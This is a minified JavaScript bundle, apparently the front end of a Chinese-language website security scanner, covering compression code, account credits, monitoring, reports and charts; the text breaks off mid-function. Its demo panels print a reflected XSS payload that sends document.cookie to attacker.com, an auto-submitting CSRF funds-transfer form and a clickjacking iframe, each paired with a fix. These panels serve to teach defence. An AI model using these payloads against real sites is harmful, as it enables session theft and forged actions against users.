Z=w.heap[W],L=W<<1;L<=w.heap_len&&(L<w.heap_len&&ne(T,w.heap[L+1],w.heap[L],w.depth)&&L++,!ne(T,Z,w.heap[L],w.depth));)w.heap[W]=w.heap[L],W=L,L<<=1;w.heap[W]=Z}function xe(w,T,W){var Z,L,X,Q,G=0;if(w.last_lit!==0)for(;Z=w.pending_buf[w.d_buf+2*G]<<8|w.pending_buf[w.d_buf+2*G+1],L=w.pending_buf[w.l_buf+G],G++,Z===0?V(w,L,T):(V(w,(X=l[L])+d+1,T),(Q=O[X])!==0&&K(w,L-=A[X],Q),V(w,X=C(--Z),W),(Q=j[X])!==0&&K(w,Z-=q[X],Q)),G<w.last_lit;);V(w,x,T)}function Ee(w,T){var W,Z,L,X=T.dyn_tree,Q=T.stat_desc.static_tree,G=T.stat_desc.has_stree,se=T.stat_desc.elems,he=-1;for(w.heap_len=0,w.heap_max=u,W=0;W<se;W++)X[2*W]!==0?(w.heap[++w.heap_len]=he=W,w.depth[W]=0):X[2*W+1]=0;for(;w.heap_len<2;)X[2*(L=w.heap[++w.heap_len]=he<2?++he:0)]=1,w.depth[L]=0,w.opt_len--,G&&(w.static_len-=Q[2*L+1]);for(T.max_code=he,W=w.heap_len>>1;1<=W;W--)le(w,X,W);for(L=se;W=w.heap[1],w.heap[1]=w.heap[w.heap_len--],le(w,X,1),Z=w.heap[1],w.heap[--w.heap_max]=W,w.heap[--w.heap_max]=Z,X[2*L]=X[2*W]+X[2*Z],w.depth[L]=(w.depth[W]>=w.depth[Z]?w.depth[W]:w.depth[Z])+1,X[2*W+1]=X[2*Z+1]=L,w.heap[1]=L++,le(w,X,1),2<=w.heap_len;);w.heap[--w.heap_max]=w.heap[1],(function(de,ze){var dt,Me,ct,me,xt,Vt,Re=ze.dyn_tree,ki=ze.max_code,Bn=ze.stat_desc.static_tree,Ln=ze.stat_desc.has_stree,On=ze.stat_desc.extra_bits,_i=ze.stat_desc.extra_base,pt=ze.stat_desc.max_length,wt=0;for(me=0;me<=y;me++)de.bl_count[me]=0;for(Re[2*de.heap[de.heap_max]+1]=0,dt=de.heap_max+1;dt<u;dt++)pt<(me=Re[2*Re[2*(Me=de.heap[dt])+1]+1]+1)&&(me=pt,wt++),Re[2*Me+1]=me,ki<Me||(de.bl_count[me]++,xt=0,_i<=Me&&(xt=On[Me-_i]),Vt=Re[2*Me],de.opt_len+=Vt*(me+xt),Ln&&(de.static_len+=Vt*(Bn[2*Me+1]+xt)));if(wt!==0){do{for(me=pt-1;de.bl_count[me]===0;)me--;de.bl_count[me]--,de.bl_count[me+1]+=2,de.bl_count[pt]--,wt-=2}while(0<wt);for(me=pt;me!==0;me--)for(Me=de.bl_count[me];Me!==0;)ki<(ct=de.heap[--dt])||(Re[2*ct+1]!==me&&(de.opt_len+=(me-Re[2*ct+1])*Re[2*ct],Re[2*ct+1]=me),Me--)}})(w,T),re(X,he,w.bl_count)}function p(w,T,W){var Z,L,X=-1,Q=T[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),T[2*(W+1)+1]=65535,Z=0;Z<=W;Z++)L=Q,Q=T[2*(Z+1)+1],++G<se&&L===Q||(G<he?w.bl_tree[2*L]+=G:L!==0?(L!==X&&w.bl_tree[2*L]++,w.bl_tree[2*I]++):G<=10?w.bl_tree[2*z]++:w.bl_tree[2*M]++,X=L,he=(G=0)===Q?(se=138,3):L===Q?(se=6,3):(se=7,4))}function D(w,T,W){var Z,L,X=-1,Q=T[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),Z=0;Z<=W;Z++)if(L=Q,Q=T[2*(Z+1)+1],!(++G<se&&L===Q)){if(G<he)for(;V(w,L,w.bl_tree),--G!=0;);else L!==0?(L!==X&&(V(w,L,w.bl_tree),G--),V(w,I,w.bl_tree),K(w,G-3,2)):G<=10?(V(w,z,w.bl_tree),K(w,G-3,3)):(V(w,M,w.bl_tree),K(w,G-11,7));X=L,he=(G=0)===Q?(se=138,3):L===Q?(se=6,3):(se=7,4)}}c(q);var R=!1;function _(w,T,W,Z){K(w,(g<<1)+(Z?1:0),3),(function(L,X,Q,G){oe(L),ee(L,Q),ee(L,~Q),o.arraySet(L.pending_buf,L.window,X,Q,L.pending),L.pending+=Q})(w,T,W)}s._tr_init=function(w){R||((function(){var T,W,Z,L,X,Q=new Array(y+1);for(L=Z=0;L<v-1;L++)for(A[L]=Z,T=0;T<1<<O[L];T++)l[Z++]=L;for(l[Z-1]=L,L=X=0;L<16;L++)for(q[L]=X,T=0;T<1<<j[L];T++)H[X++]=L;for(X>>=7;L<h;L++)for(q[L]=X<<7,T=0;T<1<<j[L]-7;T++)H[256+X++]=L;for(W=0;W<=y;W++)Q[W]=0;for(T=0;T<=143;)Y[2*T+1]=8,T++,Q[8]++;for(;T<=255;)Y[2*T+1]=9,T++,Q[9]++;for(;T<=279;)Y[2*T+1]=7,T++,Q[7]++;for(;T<=287;)Y[2*T+1]=8,T++,Q[8]++;for(re(Y,f+1,Q),T=0;T<h;T++)S[2*T+1]=5,S[2*T]=fe(T,5);J=new te(Y,O,d+1,f,y),N=new te(S,j,0,h,y),$=new te(new Array(0),P,0,m,k)})(),R=!0),w.l_desc=new B(w.dyn_ltree,J),w.d_desc=new B(w.dyn_dtree,N),w.bl_desc=new B(w.bl_tree,$),w.bi_buf=0,w.bi_valid=0,ae(w)},s._tr_stored_block=_,s._tr_flush_block=function(w,T,W,Z){var L,X,Q=0;0<w.level?(w.strm.data_type===2&&(w.strm.data_type=(function(G){var se,he=4093624447;for(se=0;se<=31;se++,he>>>=1)if(1&he&&G.dyn_ltree[2*se]!==0)return a;if(G.dyn_ltree[18]!==0||G.dyn_ltree[20]!==0||G.dyn_ltree[26]!==0)return n;for(se=32;se<d;se++)if(G.dyn_ltree[2*se]!==0)return n;return a})(w)),Ee(w,w.l_desc),Ee(w,w.d_desc),Q=(function(G){var se;for(p(G,G.dyn_ltree,G.l_desc.max_code),p(G,G.dyn_dtree,G.d_desc.max_code),Ee(G,G.bl_desc),se=m-1;3<=se&&G.bl_tree[2*U[se]+1]===0;se--);return G.opt_len+=3*(se+1)+5+5+4,se})(w),L=w.opt_len+3+7>>>3,(X=w.static_len+3+7>>>3)<=L&&(L=X)):L=X=W+5,W+4<=L&&T!==-1?_(w,T,W,Z):w.strategy===4||X===L?(K(w,2+(Z?1:0),3),xe(w,Y,S)):(K(w,4+(Z?1:0),3),(function(G,se,he,de){var ze;for(K(G,se-257,5),K(G,he-1,5),K(G,de-4,4),ze=0;ze<de;ze++)K(G,G.bl_tree[2*U[ze]+1],3);D(G,G.dyn_ltree,se-1),D(G,G.dyn_dtree,he-1)})(w,w.l_desc.max_code+1,w.d_desc.max_code+1,Q+1),xe(w,w.dyn_ltree,w.dyn_dtree)),ae(w),Z&&oe(w)},s._tr_tally=function(w,T,W){return w.pending_buf[w.d_buf+2*w.last_lit]=T>>>8&255,w.pending_buf[w.d_buf+2*w.last_lit+1]=255&T,w.pending_buf[w.l_buf+w.last_lit]=255&W,w.last_lit++,T===0?w.dyn_ltree[2*W]++:(w.matches++,T--,w.dyn_ltree[2*(l[W]+d+1)]++,w.dyn_dtree[2*C(T)]++),w.last_lit===w.lit_bufsize-1},s._tr_align=function(w){K(w,2,3),V(w,x,Y),(function(T){T.bi_valid===16?(ee(T,T.bi_buf),T.bi_buf=0,T.bi_valid=0):8<=T.bi_valid&&(T.pending_buf[T.pending++]=255&T.bi_buf,T.bi_buf>>=8,T.bi_valid-=8)})(w)}},{"../utils/common":41}],53:[function(t,r,s){r.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],54:[function(t,r,s){(function(o){(function(a,n){if(!a.setImmediate){var c,g,v,d,f=1,h={},m=!1,u=a.document,y=Object.getPrototypeOf&&Object.getPrototypeOf(a);y=y&&y.setTimeout?y:a,c={}.toString.call(a.process)==="[object process]"?function(I){process.nextTick(function(){k(I)})}:(function(){if(a.postMessage&&!a.importScripts){var I=!0,z=a.onmessage;return a.onmessage=function(){I=!1},a.postMessage("","*"),a.onmessage=z,I}})()?(d="setImmediate$"+Math.random()+"$",a.addEventListener?a.addEventListener("message",x,!1):a.attachEvent("onmessage",x),function(I){a.postMessage(d+I,"*")}):a.MessageChannel?((v=new MessageChannel).port1.onmessage=function(I){k(I.data)},function(I){v.port2.postMessage(I)}):u&&"onreadystatechange"in u.createElement("script")?(g=u.documentElement,function(I){var z=u.createElement("script");z.onreadystatechange=function(){k(I),z.onreadystatechange=null,g.removeChild(z),z=null},g.appendChild(z)}):function(I){setTimeout(k,0,I)},y.setImmediate=function(I){typeof I!="function"&&(I=new Function(""+I));for(var z=new Array(arguments.length-1),M=0;M<z.length;M++)z[M]=arguments[M+1];var O={callback:I,args:z};return h[f]=O,c(f),f++},y.clearImmediate=b}function b(I){delete h[I]}function k(I){if(m)setTimeout(k,0,I);else{var z=h[I];if(z){m=!0;try{(function(M){var O=M.callback,j=M.args;switch(j.length){case 0:O();break;case 1:O(j[0]);break;case 2:O(j[0],j[1]);break;case 3:O(j[0],j[1],j[2]);break;default:O.apply(n,j)}})(z)}finally{b(I),m=!1}}}}function x(I){I.source===a&&typeof I.data=="string"&&I.data.indexOf(d)===0&&k(+I.data.slice(d.length))}})(typeof self>"u"?o===void 0?this:o:self)}).call(this,typeof _t<"u"?_t:typeof self<"u"?self:typeof window<"u"?window:{})},{}]},{},[10])(10)})})(Xt)),Xt.exports}var yr=mr();const br=vr(yr);function xr(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),r=document.getElementById("auth-reset"),s=document.getElementById("auth-logged");i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="none")}function ti(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function Pe(){return ve()?$n().then(function(e){let i=e&&e.success&&e.data&&typeof e.data.credits=="number"?e.data.credits:e&&typeof e.credits=="number"?e.credits:null;rt("user-credits","额度："+ti(i));let t=document.getElementById("credits-balance");return t&&(t.textContent=ti(i)),i}).catch(function(){rt("user-credits","额度：--")}):(rt("user-credits","额度：--"),Promise.resolve(null))}function pi(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,r=document.getElementById("credits-usage-list");r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>'),Pe(),qn(i,t).then(function(s){let o=s&&s.data&&s.data.logs||s&&s.logs||[],a=s&&s.data&&s.data.total||s&&s.total||o.length,n=s&&s.meta||{},c=n.limit||i,g=n.offset||t,v=Math.floor(g/c)+1,d=Math.max(1,Math.ceil(a/c));wr(o),oi("credits-pagination",v,d,function(f){pi(f)}),He("credits-pagination",d>1?"flex":"none")}).catch(function(s){r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取使用记录失败</div>')})}function wr(e){let i=document.getElementById("credits-usage-list");if(!i)return;if(!e||e.length===0){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">近 30 天内没有额度变动记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(r){let s=r.amount||0,o=s<0?"var(--danger)":"var(--success)",a=(s>0?"+":"")+s;t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+E(r.action||"额度变动")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Nt(r.created_at)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700;color:'+o+'">'+a+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">余额 '+ti(r.balance_after)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}typeof window<"u"&&(window.doPasswordResetConfirm=function(){let e=document.getElementById("reset-password-token"),i=document.getElementById("reset-new-password"),t=document.getElementById("reset-new-password2"),r=e?e.value.trim():"",s=i?i.value.trim():"",o=t?t.value.trim():"";if(!r){F("请输入重置 Token");return}if(!s||s.length<6){F("新密码至少 6 个字符");return}if(s!==o){F("两次密码不一致");return}Ge("/api/auth/password-reset/confirm",{token:r,new_password:s}).then(function(a){a&&a.success?(F("密码重置成功，请重新登录"),xr()):F(Ne(a)||"密码重置失败")}).catch(function(a){F("密码重置失败："+a.message)})},window.doResendVerification=function(){resendVerification().then(function(e){F(e&&e.message||"验证邮件已重新发送")}).catch(function(e){F("重新发送失败："+e.message)})},window.doVerifyEmailFromToken=function(){let e=document.getElementById("verify-email-token"),i=e?e.value.trim():"";if(!i){F("请输入邮箱验证 Token");return}Ge("/api/auth/verify-email",{token:i}).then(function(t){t&&t.success?F("邮箱验证成功"):F(Ne(t)||"邮箱验证失败")}).catch(function(t){F("邮箱验证失败："+t.message)})});function _e(...e){return window.navigateTo(...e)}let ce=null,De=null,Zi="nginx",ye=!1,Ut=1,Gt=5,gt="",jt="",Te=!1,it=null,Fe=null,Le=null,Ce=[],Ie=0,Et=0,Bi=["正在初始化扫描引擎...","DNS 域名解析中...","建立 TCP 连接...","发送 HTTP 请求...","检查响应头安全配置...","检查 HSTS 配置...","检查 CSP 内容安全策略...","检查 X-Frame-Options...","检查 X-Content-Type-Options...","检查 Referrer-Policy...","检查 Permissions-Policy...","检测 SSL/TLS 证书...","验证证书链完整性...","检查证书有效期...","扫描敏感路径...","检测 /.env 文件...","检测 /.git 目录...","检测 /admin 后台...","检测 /phpinfo.php...","检测 /.DS_Store...","识别 WAF 防火墙...","检测 Cloudflare...","检测 Nginx WAF...","检测 ModSecurity...","检查 CORS 跨域配置...","检测 Cookie 安全标志...","检查服务器信息泄露...","计算安全评分...","生成修复建议...","生成安全报告..."],ot=!1,Ae=[];function Vi(e){let i=document.getElementById("radar-chart-container");if(!i)return;let t=[{name:"加密传输",key:"https",score:0},{name:"安全响应头",key:"headers",score:0},{name:"信息隐藏",key:"info",score:0},{name:"Cookie安全",key:"cookie",score:0},{name:"访问控制",key:"cors",score:0}],r=e.is_https||!1,s=e.findings||[];t[0].score=r?20:0;let o=s.filter(function(m){return m.name.indexOf("缺少")===0&&m.severity==="high"}).length;t[1].score=Math.max(0,20-o*3);let a=s.some(function(m){return m.name.indexOf("信息泄露")>=0});t[2].score=a?10:20;let n=s.some(function(m){return m.name.indexOf("Cookie")>=0});t[3].score=n?10:20;let c=s.some(function(m){return m.name.indexOf("CORS")>=0});t[4].score=c?10:20;let g=150,v=150,d=110,f='<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';for(let m=1;m<=5;m++){let u=d*m/5,y=[];for(let b=0;b<5;b++){let k=Math.PI*2*b/5-Math.PI/2;y.push(g+u*Math.cos(k)+","+(v+u*Math.sin(k)))}f+='<polygon points="'+y.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let m=0;m<5;m++){let u=Math.PI*2*m/5-Math.PI/2,y=g+d*Math.cos(u),b=v+d*Math.sin(u);f+='<line x1="'+g+'" y1="'+v+'" x2="'+y+'" y2="'+b+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let h=[];for(let m=0;m<5;m++){let u=Math.PI*2*m/5-Math.PI/2,y=d*t[m].score/20;h.push(g+y*Math.cos(u)+","+(v+y*Math.sin(u)))}f+='<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>',f+='<polygon points="'+h.join(" ")+'" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">',f+='<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>',f+="</polygon>";for(let m=0;m<5;m++){let u=Math.PI*2*m/5-Math.PI/2,y=d*t[m].score/20,b=g+y*Math.cos(u),k=v+y*Math.sin(u);f+='<circle cx="'+b+'" cy="'+k+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>'}for(let m=0;m<5;m++){let u=Math.PI*2*m/5-Math.PI/2,y=g+(d+25)*Math.cos(u),b=v+(d+25)*Math.sin(u),k=Math.abs(Math.cos(u))<.2?"middle":Math.cos(u)>0?"start":"end";f+='<text x="'+y+'" y="'+b+'" text-anchor="'+k+'" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">'+t[m].name+"</text>",f+='<text x="'+y+'" y="'+(b+14)+'" text-anchor="'+k+'" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">'+t[m].score+"/20</text>"}f+="</svg>",i.innerHTML=f}function kr(e){let i=document.getElementById("attack-demo-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者构造的恶意页面</div><div>&lt;form action="'+E(e)+'/api/transfer" method="POST"&gt;</div><div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div><div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div><div>&lt;/form&gt;</div><div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div></div><div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px"><strong>如果目标未设置 CSRF Token，受害者点击后资金会被转走。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF Token 验证</div></div>')}function _r(e){let i=document.getElementById("attack-demo-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击 URL</div><div>'+E(e)+`/search?q=&lt;script&gt;</div><div>&nbsp;&nbsp;fetch('//attacker.com/steal?c='+document.cookie)</div><div>&nbsp;&nbsp;&lt;/script&gt;</div><div>// 受害者的 Cookie 被发送到攻击者服务器</div></div><div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px"><strong>如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div></div>`)}function Sr(e){let i=document.getElementById("attack-demo-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">点击劫持</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者页面</div><div>&lt;iframe src="'+E(e)+'"</div><div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div><div>&lt;/iframe&gt;</div><div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div></div><div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px"><strong>用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div></div>')}function Xi(e){let i=document.querySelector(".score-ring .score-value");if(!i)return;e=parseInt(e,10),(isNaN(e)||e<0)&&(e=0),e>100&&(e=100),it&&(clearInterval(it),it=null);let t=0,r=Math.max(1,Math.floor(e/50));it=setInterval(function(){t+=r,t>=e&&(t=e,clearInterval(it),it=null),i.textContent=t},20)}function ui(){try{return(function(){try{return JSON.parse(localStorage.getItem("vs_monitors")||"[]")}catch{return[]}})()}catch{return[]}}function Gi(e){try{(function(){try{localStorage.setItem("vs_monitors",JSON.stringify(e))}catch{}})()}catch{}}function Er(){let e=document.getElementById("monitor-url-input"),i=document.getElementById("monitor-freq-select"),t=e.value.trim(),r=i.value;if(!t){F("请输入 URL");return}/^https?:\/\//i.test(t)||(t="http://"+t);let s=ui();if(s.some(function(n){return n.url===t})){F("该 URL 已在监控列表中");return}let a={url:t,freq:r,added_at:new Date().toISOString(),last_scan:"-",score:null};ue("/api/targets",{method:"POST",body:JSON.stringify({url:t,schedule:r})}).then(function(n){return n.json()}).then(function(n){n.id&&(a.id=n.id)}).catch(function(){}),s.push(a),Gi(s),e.value="",fi(),F("监控目标已添加")}function zr(e){if(!confirm("确定要删除此监控目标吗？"))return;let i=ui(),t=i[e];t&&t.id&&ue("/api/targets/"+t.id,{method:"DELETE"}).catch(function(){}),i.splice(e,1),Gi(i),fi(),F("监控目标已删除")}function fi(){let e=document.getElementById("monitor-target-list");if(!e)return;let i=ui();if(i.length===0){e.innerHTML='<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';return}let t={daily:"每天",weekly:"每周",none:"不扫描"},r="";i.forEach(function(s,o){let a=s.score!==null?s.score>=75?"var(--success)":s.score>=50?"var(--warning)":"var(--danger)":"var(--text-lighter)";r+='<div class="monitor-item">',r+='<div style="flex:1;min-width:0">',r+='<div class="monitor-item-url">'+E(s.url)+"</div>",r+='<div class="monitor-item-meta">'+t[s.freq]||s.freq+" &middot; 上次扫描: "+(s.last_scan||"-")+"</div>",r+="</div>",r+='<div class="monitor-item-score" style="color:'+a+'">'+(s.score!==null?s.score:"-")+"</div>",r+='<button class="monitor-item-del" onclick="removeMonitorTarget('+o+')"></button>',r+="</div>"}),e.innerHTML=r}function Ir(e){if(!ce){F("暂无扫描结果");return}let i=e||"pdf",t=i==="html"?"HTML":"PDF",r=i==="html"?"html":"pdf";F("正在生成 "+t+" 报告，请稍候...");function s(a){let n="/api/report/"+encodeURIComponent(a)+"?format="+i,c=Tr(ce.url,r);i==="html"?ue(n).then(function(g){if(!g.ok)throw new Error("报告生成失败 ("+g.status+")");return g.text()}).then(function(g){let v=new Blob([g],{type:"text/html;charset=utf-8"}),d=URL.createObjectURL(v),f=document.createElement("a");f.href=d,f.download=c,document.body.appendChild(f),f.click(),document.body.removeChild(f),URL.revokeObjectURL(d),F("HTML 报告已下载："+c)}).catch(function(g){F("报告下载失败: "+g.message)}):ue(n).then(function(g){if(!g.ok)throw new Error("PDF 生成失败 ("+g.status+")");return g.blob()}).then(function(g){let v=URL.createObjectURL(g),d=document.createElement("a");d.href=v,d.download=c,document.body.appendChild(d),d.click(),document.body.removeChild(d),URL.revokeObjectURL(v),F("PDF 报告已下载："+c)}).catch(function(g){F("PDF 下载失败: "+g.message)})}let o=ce.scan_id;!o||isNaN(Number(o))?ue("/api/history?limit=1").then(function(a){return a.json()}).then(function(a){let n=(a.history||[])[0];n&&n.id?s(n.id):F("当前结果暂不支持下载")}).catch(function(a){F("获取扫描记录失败: "+a.message)}):s(o)}function Tr(e,i){return"security-report-"+((Qe(e||"report")||"report").replace(/[^a-zA-Z0-9._-]+/g,"-").replace(/^-+|-+$/g,"")||"report")+"."+i}function Cr(){let e=document.getElementById("report-dropdown");e&&(e.classList.toggle("show"),e.classList.contains("show")&&setTimeout(function(){document.addEventListener("click",Ji)},0))}function Ji(e){let i=document.querySelector(".report-download-dropdown"),t=document.getElementById("report-dropdown");i&&!i.contains(e.target)&&t&&(t.classList.remove("show"),document.removeEventListener("click",Ji))}function Ar(){try{return localStorage.getItem("vs_home_onboarding_seen")!=="1"}catch{return!0}}function Br(){try{localStorage.setItem("vs_home_onboarding_seen","1")}catch{}let e=document.getElementById("home-onboarding-banner");e&&(e.style.display="none")}function Lr(){let e=document.getElementById("home-onboarding-banner");e&&(Ar()?e.style.display="block":e.style.display="none")}function Ki(){let e=document.getElementById("scan-credits-hint"),i=document.getElementById("scan-credits-value");if(!(!e||!i)){if(!ve()){e.style.display="none";return}e.style.display="block",ue("/api/me/credits").then(function(t){return t.json()}).then(function(t){let r=t&&t.data&&typeof t.data.credits=="number"?t.data.credits:t&&typeof t.credits=="number"?t.credits:null;i.textContent=r===null?"--":String(r)}).catch(function(){i.textContent="--"})}}function Or(){let e=document.getElementById("dashboard-overview");if(!ve()){e&&(e.style.display="none");return}e&&(e.style.display="grid"),Lr(),Ki(),ue("/api/dashboard").then(function(i){return i.json()}).then(function(i){let t=document.getElementById("home-stat-scan-count"),r=document.getElementById("home-stat-high-risk"),s=document.getElementById("home-stat-fixed-count"),o=document.getElementById("home-stat-score");t&&(t.textContent=i.total_scans||0),r&&(r.textContent=i.high_risk_count||0),s&&(s.textContent=i.fixed_count||0),o&&i.recent_scans&&i.recent_scans.length>0?o.textContent=i.recent_scans[0].score||"-":o&&(o.textContent="-")}).catch(function(){}),Yi(),loadTrendChart(30)}function Yi(){let e=document.getElementById("trend-panel");!ve()||!e||(e.style.display="block",ue("/api/trend?limit=30").then(function(i){return i.json()}).then(function(i){let t=i.summary||{},r=i.series||{},s=i.urls||[],o=document.getElementById("trend-summary");if(o){let c=[];t.total_scans>0&&(c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 '+t.avg_score+" 分</span>"),t.improved?c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>'):t.total_scans>1&&c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>')),o.innerHTML=c.join("")}let a=document.getElementById("trend-empty"),n=document.getElementById("trend-canvas");if(t.total_scans===0){a&&(a.style.display="flex"),n&&(n.style.display="none");return}a&&(a.style.display="none"),n&&(n.style.display="block"),Qi(r,s)}).catch(function(){}))}function Qi(e,i){let t=document.getElementById("trend-canvas");if(!t)return;let r=t.getContext("2d"),s=window.devicePixelRatio||1,o=t.parentElement.getBoundingClientRect();t.width=o.width*s,t.height=o.height*s,r.scale(s,s);let a=o.width,n=o.height,c=["#4b6eaf","#73c990","#f0a732","#c75450","#c75450","#4b6eaf","#4b6eaf"],g=[],v=[];for(let z=0;z<i.length;z++){let M=i[z],O=e[M]||[];if(O.length===0)continue;let j=O.map(function(P){return P.score});v=v.concat(j),g.push({url:M,points:O,color:c[z%c.length]})}if(g.length===0||v.length===0)return;let d={top:20,right:20,bottom:30,left:45},f=a-d.left-d.right,h=n-d.top-d.bottom,m=Math.max(Math.min.apply(null,v)-5,0),u=Math.min(Math.max.apply(null,v)+5,100),y=u-m||1;r.clearRect(0,0,a,n),r.strokeStyle="rgba(255,255,255,0.06)",r.lineWidth=1;let b=5;for(let z=0;z<=b;z++){let M=d.top+z/b*h;r.beginPath(),r.moveTo(d.left,M),r.lineTo(a-d.right,M),r.stroke();let O=Math.round(u-z/b*y);r.fillStyle="rgba(255,255,255,0.4)",r.font="10px sans-serif",r.textAlign="right",r.fillText(O,d.left-8,M+3)}let k=d.top+(u-90)/y*h,x=d.top+(u-70)/y*h;r.fillStyle="rgba(115,201,144,0.05)",r.fillRect(d.left,k,f,d.top-k+h),r.fillStyle="rgba(240,167,50,0.05)",r.fillRect(d.left,x,f,k-x);for(let z=0;z<g.length;z++){let M=g[z],O=M.points,j=O.length;if(j<1)continue;let P=[];for(let U=0;U<j;U++)P.push(d.left+(j>1?U/(j-1)*f:f/2));r.beginPath();for(let U=0;U<j;U++){let Y=P[U],S=d.top+(u-O[U].score)/y*h;U===0?r.moveTo(Y,S):r.lineTo(Y,S)}r.lineTo(P[j-1],d.top+h),r.lineTo(P[0],d.top+h),r.closePath(),r.fillStyle=M.color+"15",r.fill(),r.beginPath(),r.strokeStyle=M.color,r.lineWidth=2.5,r.lineJoin="round",r.lineCap="round";for(let U=0;U<j;U++){let Y=P[U],S=d.top+(u-O[U].score)/y*h;U===0?r.moveTo(Y,S):r.lineTo(Y,S)}r.stroke();for(let U=0;U<j;U++){let Y=P[U],S=d.top+(u-O[U].score)/y*h;r.beginPath(),r.arc(Y,S,4,0,Math.PI*2),r.fillStyle=M.color,r.fill(),r.beginPath(),r.arc(Y,S,2,0,Math.PI*2),r.fillStyle="#fff",r.fill()}if(j>0){let 